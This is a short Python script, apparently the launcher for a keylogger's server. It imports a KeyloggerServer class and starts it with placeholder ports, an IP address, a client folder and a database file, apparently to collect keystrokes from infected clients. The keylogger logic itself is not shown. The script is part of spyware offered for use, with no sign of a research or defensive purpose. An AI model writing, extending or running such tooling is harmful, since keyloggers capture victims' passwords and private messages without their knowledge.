from keylogger_server import KeyloggerServer



rm_logger = KeyloggerServer("PORT-1", "PORT-2", "IP_Address", "ClientFolder", "clientDatabase.db")
rm_logger.start()

